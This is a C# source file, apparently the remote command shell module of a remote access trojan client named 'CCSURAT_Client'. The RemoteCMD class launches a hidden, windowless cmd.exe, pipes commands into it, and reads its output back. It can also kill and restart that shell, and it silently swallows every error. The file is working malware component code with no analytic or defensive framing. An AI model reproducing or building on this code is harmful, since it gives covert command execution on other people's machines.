using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace CCSURAT_Client.Control
{
    class RemoteCMD
    {
        Process cmd;
        StreamWriter stdin;
        StreamReader stdout;
        private string data = string.Empty;
        delegate string ReadLineDelegate();
        private bool firstrun;

        public RemoteCMD()
        {
            try
            {
                firstrun = true;
                cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.UseShellExecute = false;
                
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                cmd.Start();
                stdin = cmd.StandardInput;
                stdout = cmd.StandardOutput;

            }
            catch (Exception ex)
            {

            }

        }

        public void Write(string data)
        {
            try
            {
                stdin.WriteLine(data + Environment.NewLine);
            }
            catch (Exception ex)
            {

            }
        }

   
        public void Stop()
        {
            try
            {
                cmd.Kill();
                data = string.Empty;
            }
            catch (Exception ex)
            {

            }
        }

        public void Restart()
        {
            try
            {
                firstrun = true;
                cmd.Kill();
                while (!cmd.HasExited)
                {
                    System.Threading.Thread.Sleep(1);
                    Application.DoEvents();
                }
                data = string.Empty;
                cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.Start();
                stdin = cmd.StandardInput;
                stdout = cmd.StandardOutput;
            }
            catch (Exception ex)
            {

            }
        }

        public string GetResponse()
        {
            try
            {
                data = string.Empty;
                string line;
                int sleep;
                if (firstrun)
                {
                    sleep = 400;
                }
                else
                {
                    sleep = 100;
                }

                ReadLineDelegate rl = new ReadLineDelegate(stdout.ReadLine);
                while (true)
                {
                    IAsyncResult ares = rl.BeginInvoke(null, null);
                    if (ares.AsyncWaitHandle.WaitOne(sleep) == false)
                    {
                        break;
                    }
                    line = rl.EndInvoke(ares);
                    if (line != null)
                    {
                        data += line + Environment.NewLine;
                    }
                }
            }
            catch (Exception ex)
            {

            }
            return data;

        }
       
    }
}
